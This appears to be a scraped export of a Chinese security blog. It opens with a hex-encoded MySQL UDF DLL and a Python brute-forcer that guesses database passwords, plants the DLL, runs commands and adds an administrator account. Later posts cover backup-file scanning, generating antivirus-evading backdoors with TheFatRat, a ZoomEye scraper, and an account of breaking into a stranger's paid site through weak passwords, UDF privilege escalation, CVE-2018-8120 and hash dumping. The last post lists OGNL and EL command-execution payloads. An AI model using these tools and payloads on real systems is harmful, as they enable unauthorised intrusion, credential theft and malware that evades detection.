10000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;) if (data[0][0] &lt; 5) or ((data[0][0] == 5) and (data[0][2] &lt;= 1)): try: basedir = &quot;select &#39;%s&#39; into dumpfile &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;&quot; %udf cursor.execute(basedir) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; else: try: cursor.execute(&quot;select @@basedir;&quot;) dir = cursor.fetchone() basedir1 = &quot;select &#39;plugin&#39; into dumpfile &#39;%s&#39;;&quot; %(dir[0]+&quot;lib/plugin::$INDEX_ALLOCATION&quot;) basedir2 = &quot;select &#39;%s&#39; into dumpfile &#39;%s&#39;;&quot; %(udf, dir[0]+&quot;lib/plugin/udf.dll&quot;) cursor.execute(basedir1) cursor.execute(basedir2) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; db.close() break except: continue def mssql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = pymssql.connect(host=queue, user=&quot;sa&quot;, password=mm.strip(&#39;\\n&#39;), database=&quot;master&quot;, connect_timeout=2) print u&quot;爆破%s:1433端口成功，账号密码为: sa/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() try: cursor.execute(&quot;exec master..xp_cmdshell &#39;whoami&#39;;&quot;) except: cursor.execute(&quot;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;) try: cursor.execute(&quot;exec master..xp_cmdshell &#39;net user wait wait /add&#39;;&quot;) cursor.execute(&quot;exec master..xp_cmdshell &#39;net user administrators wait /add&#39;;&quot;) with open(&quot;mssql.txt&quot;,&#39;a&#39;) as fs: fs.write(queue+&quot;:1433 账号密码为 sa/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm.strip(&#39;\\n&#39;) except: print queue + u&quot; xp_cmdshell 执行失败&quot; db.close() except: continue def main(): queue = Queue.Queue() threads = [] with open(&quot;ip.txt&quot;) as f: file = f.readlines() for i in file: ip = i.strip(&#39;\\n&#39;) for x in IPy.IP(ip): queue.put(x) for i in xrange(1): threads.append(thread(queue)) for i in threads: i.start() for i in threads: i.join() if name == “main“: main() `","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"基于scrapy的备份文件扫描","slug":"基于scrapy的备份文件扫描","date":"2018-09-27T02:51:38.000Z","updated":"2018-09-27T03:12:06.941Z","comments":true,"path":"2018/09/基于scrapy的备份文件扫描/","link":"","permalink":"/2018/09/基于scrapy的备份文件扫描/","excerpt":"","text":"Scrapy，Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动测试。 首先生成项目文件 scrapy startproject spiderdata 生成成功后，会有以下目录结构，首先在spiderdata中的spider目录创建我们的spider文件。 备份文件扫描文件名，有两个选择，一是基于字典，二是根据url的备份文件名，从以往发现备份文件的结果上看，两种方式都是经常存在使用的。 于是创建backup文件，用来生成备份文件名，创建一个列表用来存储字典文件名，另外创建一个方法用来基于url生成备份文件名。 #coding:utf-8 import urlparse class backup(object): def __init__(self, url): self.url = url self.list2 = [&#39;/db.zip&#39;, &#39;/fdsa.rar&#39;, &#39;/ftp.rar&#39;, &#39;/gg.rar&#39;, &#39;/hdocs.rar&#39;, &#39;/hdocs.zip&#39;, &#39;/a.zip&#39;, &#39;/web.zip&#39;, &#39;/web.rar&#39;, &#39;/1.rar&#39;, &#39;/bbs.rar&#39;, &#39;/www.root.rar&#39;, &#39;/123.rar&#39;, &#39;/data.rar&#39;, &#39;/bak.rar&#39;, &#39;/oa.rar&#39;, &#39;/admin.rar&#39;, &#39;/www.rar&#39;, &#39;/2014.rar&#39;, &#39;/2015.rar&#39;, &#39;/2016.rar&#39;, &#39;/2014.zip&#39;, &#39;/2015.zip&#39;, &#39;/2016.zip&#39;, &#39;/2017.zip&#39;, &#39;/1.zip&#39;, &#39;/1.gz&#39;, &#39;/1.tar.gz&#39;, &#39;/2.zip&#39;, &#39;/2.rar&#39;, &#39;/123.rar&#39;, &#39;/123.zip&#39;, &#39;/a.rar&#39;, &#39;/a.zip&#39;, &#39;/admin.rar&#39;, &#39;/back.rar&#39;, &#39;/backup.rar&#39;, &#39;/bak.rar&#39;, &#39;/bbs.rar&#39;, &#39;/bbs.zip&#39;, &#39;/beifen.rar&#39;, &#39;/beifen.zip&#39;, &#39;/beian.rar&#39;, &#39;/data.rar&#39;, &#39;/data.zip&#39;, &#39;/HYTop.rar&#39;, &#39;/root.rar&#39;, &#39;/Release.rar&#39;, &#39;/Release.zip&#39;, &#39;/sql.rar&#39;, &#39;/test.rar&#39;, &#39;/template.rar&#39;, &#39;/template.zip&#39;, &#39;/upfile.rar&#39;, &#39;/vip.rar&#39;, &#39;/wangzhan.rar&#39;, &#39;/wangzhan.zip&#39;, &#39;/web.rar&#39;, &#39;/web.zip&#39;, &#39;/website.rar&#39;, &#39;/www.rar&#39;, &#39;/www.zip&#39;, &#39;/wwwroot.rar&#39;, &#39;/wwwroot.zip&#39;, &#39;/wz.rar&#39;] def backup(self): list_a = [] parse = urlparse.urlparse(self.url) name = parse.netloc.split(&#39;.&#39;) name_url = parse.netloc.replace(&#39;.&#39;, &#39;&#39;) for i in [&#39;.rar&#39;, &#39;.zip&#39;, &#39;.tar.gz&#39;, &#39;.7z&#39;]: list_a.append(parse.scheme + &#39;://&#39; + parse.netloc + &#39;/&#39; + parse.netloc + i) #http://www.baidu.com/www.baidu.com.zip if &#39;www&#39; in name: list_a.append(self.url + &#39;/&#39; + name[1] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + &#39;&#39;.join(name[1:]) + i) #http://www.baidu.com/baiducom.zip else: list_a.append(self.url + &#39;/&#39; + name[0] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + name_url + i) #http://www.baidu.com/wwwbaiducom.zip for x in self.list2: list_a.append(self.url + x) return list_a 在spider的爬虫文件中使用以下代码 #coding:utf-8 import scrapy from backup import backup from ..items import SpiderdateItem class spiderdata(scrapy.Spider): name = &quot;spiderdata&quot; content_type = [&#39;application/x-rar&#39;,&#39;application/x-gzip&#39;,&#39;application/zip&#39;,&#39;application/octet-stream&#39;,&#39;application/x-7z-compressed&#39;] def start_requests(self): with open(&#39;ip.txt&#39;,&#39;r&#39;) as f: for i in f.readlines(): ip = i.strip(&#39;\\n&#39;) back = backup(ip) url_ip = back.backup() for x in url_ip: yield scrapy.Request(x, callback=self.parse,dont_filter=True) def parse(self, response): item = SpiderdateItem() if response.headers[&#39;Content-Type&#39;] in self.content_type: print &quot;[&quot; + str(response.status) + &quot;]&quot; + u&#39; 检测到存在备份文件的URL: &#39;+ response.url item[&#39;url&#39;] = response.url yield item 调用之前创建的备份文件名函数，使用start_requests来生成一个可迭代对象。 数据通过item来保存本地，所以在items中创建一个参数，并且在settings中开启item管道。 url = scrapy.Field() 在piplines中创建本地文件保存文件，创建一次文件对象，写入后根据 爬虫关闭后再关闭本地文件。 def __init__(self): self.f = open(&quot;url.txt&quot;,&#39;w&#39;) def process_item(self, item, spider): self.f.write(item[&#39;url&#39;].encode(&quot;utf-8&quot;)+&#39;\\n&#39;) return item def close_spider(self, spider): self.f.close() 因此只需在spiderdata中创建ip.txt文件即可，写入需要检测的url，另外如果不想看到scrapy的log输出，可以用在setting中添加如下： LOG_LEVEL = &#39;WARNING&#39; 只显示warning级的log输出.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"使用docker创建镜像","slug":"使用docker创建镜像","date":"2018-09-25T06:40:17.000Z","updated":"2018-09-27T02:44:04.358Z","comments":true,"path":"2018/09/使用docker创建镜像/","link":"","permalink":"/2018/09/使用docker创建镜像/","excerpt":"","text":"在测试以及开源工具使用中，docker的便捷越来越成为快速部署的选择，那我们怎么构建自己的docker镜像。 构建Docker镜像有以下两种方法： 使用docker commit命令。 使用docker build命令和 Dockerfile 文件 docker commit命令首先我们在本地拉取ubuntu镜像作为基础的镜像环境。 如果我们在拉取的ubuntu镜像上安装 nginx，使用 docker run -it 镜像名 /bin/bash 这样进入需要修改的镜像内部。 首先按照一般操作步骤， apt-get update apt-get -y install nginx 等待构建结束后，使用exit退出，保存镜像，避免镜像内容丢失。 docker commit 修改的镜像id 用户名/仓库名 结束后便构建了一个设定好的镜像，如下所示。 如果需要上传镜像仓库，在https://hub.docker.com/注册登陆创建仓库即可，然后使用docker login登陆，此处使用的是命令行参数直接登陆。 执行：docker push 用户名/仓库名:标签 在hub.docker上就可以看到镜像信息了： 如需运行构建的docker docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; –name: 容器名 nginx -g “daemon off;” 表示在镜像内运行的命令，在前台开启一个nginx进程 访问映射端口32768则可以看到安装的nginx了。 Dockerfile使用docker commit现在已经不推荐，推荐使用更为灵活的Dockerfile来构建镜像，如下Dockerfile，同样是在ubuntu下构建nginx FROM ubuntu:18.04 MAINTAINER misaki RUN apt-get update &amp;&amp; apt-get -y install nginx RUN echo &quot;hello world&quot; &gt; /var/www/html/index.nginx-debian.html EXPOSE 80 新建目录web，此目录就是构建环境目录。在Dockerfile中写入如下命令，FROM指构建环境，这里选用ubuntu 18.04版本，必须为第一行信息，注意这里都要小写，MAINTAINER指作者信息，RUN指在构建环境中需要运行的命令，每一个RUN都意味着建立一层，层数过多增加构建部署时间，也容易出错，所以尽量使用&amp;&amp;，在一层中构建命令。EXPOSE指应用程序使用容器的指定端口，设为80。也就是Dockerfile其实就是安装的每一条命令都写在一个文件内，这样运行后，程序自动的执行安装更新配置等等。 运行 docker run -t=&quot;misakiyui/web&quot; . (点是必须的)开始构建镜像 构建完成后再docker images中便可以看到设定的镜像了 运行 docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; 开启镜像 这时候查看映射到本地的端口docker ps，本地映射32772端口，访问后就可以看到修改的信息和nginx了 。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"关于Thefatrat免杀使用","slug":"关于Thefatrat免杀使用","date":"2018-09-20T03:07:18.000Z","updated":"2018-09-20T05:18:56.082Z","comments":true,"path":"2018/09/关于Thefatrat免杀使用/","link":"","permalink":"/2018/09/关于Thefatrat免杀使用/","excerpt":"","text":"最近尝试了免杀工具thefatrat，记录一些使用过程和坑： 常见的免杀方式一般是：文件免杀方法和内存免杀方法 文件免杀指：加壳、加花等。内存免杀指：修改内存特征码、修改字符串等。 推荐一篇博文：http://anhkgg.com/aanti-virus/ 下面就记录thefatrat的使用和杀软查杀结果：采用在线查杀https://www.virustotal.com和http://www.virscan.org/language/zh-cn/ thefatrat的项目地址为：https://github.com/screetsec/thefatrat 安装步骤为： git clone https://github.com/Screetsec/TheFatRat.git cd TheFatRat chmod +x setup.sh &amp;&amp; ./setup.sh 安装后，建议查看logs文件夹下的fudwin文件,记录了安装使用中的存在的问题，比如使用中会出现There was an error creating your FUD rat with Powerstager 这种错误，查看fudwin文件，可以看到py2没有安装names模块，安装后正常使用。 再给以下文件权限 chmod + x fatrat chmod + x powerfull.sh ./fatrat 启动界面 第一项：利用msf生产后门，基本没免杀效果 第二项 ：利用powerstager混淆，从结果来看效果不错 第三项和第四项使用中报错和不能选择的问题，尚不得知问题原因，后续更新 第五项：生成apk后门 第六项：这个就是可以创建bat后门，但是里面还有c#编译和c编译等，但是被查杀率极高 第七项：生成office类后门 第八项：生成Linux后门 此次针对windows系统，下面用第二项的fudwin，进入后 使用第一项，第二项不确定是不是编码原因，全是乱码，选择后可以看到提示的本地IP和公网IP 执行完成后，在output文件夹下生成制定的exe文件，中间会选择图标 利用https://www.virustotal.com查看下效果如何，从结果上看不是很优秀，不过比较意外的是，360居然没查杀，国内几家免费杀软都没识别 尝试使用http://www.virscan.org/检查文件 结果更少，只有四个查杀(不确定是不是引擎版本问题) 从两个结果看 两边能查杀的国内杀软就江民杀毒，F-Secure在VirusTotal可以查杀，在VirSCAN没有查杀 运行文件查看是否能正常执行获得shell。 运行后用msf做监听，可以看到收到了shell thefatrat比较出众的一点就是可以生成bat后门文件，选择Create Fud Backdoor 1000% with PwnWinds 在程序output文件夹下的bat上传到 https://www.virustotal.com 被360查杀，但是能过江民，F-Secure，和国内其他家杀软 同样用msf监听执行情况，可以收到shell 以上文件在电脑管家和火绒环境下，静态查毒或者运行都不查杀。 在采用Create Fud 100% Backdoor with Fudwin 1.0中的Powerstager 0.2.5 by z0noxz (powershell)生成exe文件，再用upx加壳 Upx -7 aaa.exe 这个结果还算是能看，能查杀基本完全脱离国内杀软了 不过值得一提的就是上午电脑管家还不能查杀，下午就全国联保了，应该是上传可疑文件云端检测了，不过既然没有查杀也没有报可疑，为什么会上传检测，倒是一个问题。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"zoomeye接口实现","slug":"zoomeye接口实现","date":"2018-09-18T04:44:29.000Z","updated":"2018-09-20T04:35:56.085Z","comments":true,"path":"2018/09/zoomeye接口实现/","link":"","permalink":"/2018/09/zoomeye接口实现/","excerpt":"","text":"zoomeye的接口网上不少人做过实现，之前在学python的json信息处理，便写了这个一个利用脚本，唯一的坑就是wiki和返回信息不一样，浪费了点时间。没有多少难度，就是写了不少提示符，用来多次和提示输入。 #coding:utf-8 #author:misaki import requests import json import re def geturl(): app = raw_input(&#39;app:&#39;) app2 = input(&#39;page:&#39;) app3 = raw_input(&#39;country:&#39;) for i in xrange(1,app2+1): i=str(i) url=&#39;https://api.zoomeye.org/web/search?query=app:&#39;+app+&#39;&amp;page=&#39;+i+&#39;&amp;country=&#39;+app3 r2=requests.get(url,headers=headers) soup = r2.text a=json.loads(soup) #获取site for i in a[&#39;matches&#39;]: f=open(app+&#39;.txt&#39;,&#39;a&#39;) f.write(str(i[&#39;site&#39;])+&#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;web.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getip(): app4 = raw_input(&#39;app:&#39;) app5 = input(&#39;page:&#39;) app6 = raw_input(&#39;country:&#39;) for i in xrange(1, app5 + 1): i = str(i) url = &#39;https://api.zoomeye.org/host/search?query=&#39; + app4 + &#39;&amp;page=&#39; + i +&#39;&amp;country=&#39; + app6 r2 = requests.get(url, headers=headers) parrten = re.compile(r&#39;(?&lt;![\\.\\d])(?:\\d{1,3}\\.){3}\\d{1,3}(?![\\.\\d])&#39;) #获取ip ip = parrten.findall(str(r2.text)) for i in ip: f = open(app4+&#39;.txt&#39;, &#39;a&#39;) f.write(str(i) + &#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;host.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getuser(): url = &#39;https://api.zoomeye.org/resources-info&#39; r2 = requests.get(url, headers=headers) soup = json.loads(r2.text) print &#39;\\r&#39; print &#39;plan: %s&#39; %soup[&#39;plan&#39;] print &#39;search_num: %s&#39; %soup[&#39;resources&#39;][&#39;search&#39;] print &#39;stats: %s&#39; %soup[&#39;resources&#39;][&#39;stats&#39;] def main(): print &#39;Input service number&#39; print &#39;1 - web_search&#39; print &#39;2 - host_search&#39; print &#39;3 - resources_info&#39; name = raw_input(&#39;input num:&#39;) print &#39;\\r&#39; while name not in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]: name = raw_input(&#39;input num:&#39;) if name != &#39;&#39;: try: if name == &#39;1&#39;: geturl() elif name == &#39;2&#39;: getip() elif name == &#39;3&#39;: getuser() except: pass if __name__==&#39;__main__&#39;: print &#39;#######&#39; print &#39; # #### #### # # ###### # # ######&#39; print &#39; # # # # # ## ## # # # # &#39; print &#39; # # # # # # ## # ##### # ##### &#39; print &#39; # # # # # # # # # # &#39; print &#39; # # # # # # # # # # &#39; print &#39;####### #### #### # # ###### # ######&#39; print &#39;auther:misaki&#39; print &#39;\\r&#39; print &#39;Input your username and password&#39; username = raw_input(&#39;username:&#39;) password = raw_input(&#39;password:&#39;) print &#39;\\r&#39; if username and password != -1: data = {&quot;username&quot;: username, &quot;password&quot;: password} s = json.dumps(data, indent=4) r = requests.post(&#39;https://api.zoomeye.org/user/login&#39;, data=s) if r.status_code == 200: token = r.text headers = {&#39;Authorization&#39;: &#39;JWT&#39; + &#39; &#39; + token[18:-2]} main() else: print &#39;Incorrect username or password&#39; ​​","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"对意外发现的某站点测试","slug":"对意外发现的某站点测试","date":"2018-09-18T04:43:59.000Z","updated":"2018-09-20T04:37:09.019Z","comments":true,"path":"2018/09/对意外发现的某站点测试/","link":"","permalink":"/2018/09/对意外发现的某站点测试/","excerpt":"","text":"朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文 爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie 弱口令爆破成功，进入宝塔后台 从宝塔后台获取phpmyadmin，root权限 同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限 上传shell，同样是只能看到当前网站目录 考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接 采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出 因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件 通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤： Udf需要导出到\\lib\\plugin目录，一般该目录不存在\\lib\\plugin目录。 可以尝试利用NTFS ADS创建 plugin目录 查询 select &#39;xxx&#39; into dumpfile &#39;C:\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#39;; 导出UDF.DLL 随便选一个库 查询 CREATE TABLE Temp_udf(udf BLOB); 查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#39;;-- 查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 查询 select * from mysql.func; 查询 select cmdshell(&#39;net user test test /add&#39;); ​ 手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器 利用Cve-2018-8120创建账号完成添加管理员 导出hash，利用Pwdump7 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"表达式注入","slug":"表达式注入","date":"2018-09-18T04:29:45.000Z","updated":"2018-09-20T04:36:56.198Z","comments":true,"path":"2018/09/表达式注入/","link":"","permalink":"/2018/09/表达式注入/","excerpt":"","text":"在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地收集了相关资料做一份表达式注入的文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。 流行的表达式语言：Struts2——OGNL实至名归的“漏洞之王”，表达式的格式: ​ @[类全名（包括包路径）]@[方法名 | 值名]，例如： ​ @java.lang.String@format(&#39;foo %s&#39;, &#39;bar&#39;) 基本用法： java ActionContext AC = ActionContext.getContext(); Map Parameters = (Map)AC.getParameters(); String expression = &quot;${(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()}&quot;; AC.getValueStack().findValue(expression)); 相关漏洞： s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017 Spring——SPELSPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。 基本用法： 在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。 java String expression = &quot;T(java.lang.Runtime).getRuntime().exec(/&quot;calc/&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); JSP——JSTL_EL这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。 基本用法： jsp &lt;spring:message text=&quot;${/&quot;/&quot;.getClass().forName(/&quot;java.lang.Runtime/&quot;).getMethod(/&quot;getRuntime/&quot;,null).invoke(null,null).exec(/&quot;calc/&quot;,null).toString()}&quot;&gt; &lt;/spring:message&gt; Elasticsearch——MVELElasticsearch的CVE-2014-3120这个漏洞 MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。 基本用法： java import org.mvel.MVEL; public class MVELTest { ​ public static void main(String[] args) { ​ String expression = &quot;new java.lang.ProcessBuilder(/&quot;calc/&quot;).start();&quot;; ​ Boolean result = (Boolean) MVEL.eval(expression, vars); ​ } } 执行代码：OGNL表达式注入：示例：泛微E-Mobile 表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。 先用一个小的加减乘除做验证： 执行exp语句，执行命令whoami， @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())： 尝试报路径，但此例并不成功 %24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D EL表达式注入：​ 实例：CVE-2011-2730 EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。 EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 语法：${运算表达式}，EL表达式支持如下运算符： 1、关系运算符 2、逻辑运算符： 3、empty运算符：检查对象是否为null(空) 4、二元表达式：${user!=null?user.name :””} 5、[ ] 和 . 号运算符 执行exp语句： ${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())} Primefaces框架表达式注入:Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密! 命令：java -cp .\\de.jar test.EncodeDecode exp 验证(代码): ${facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: 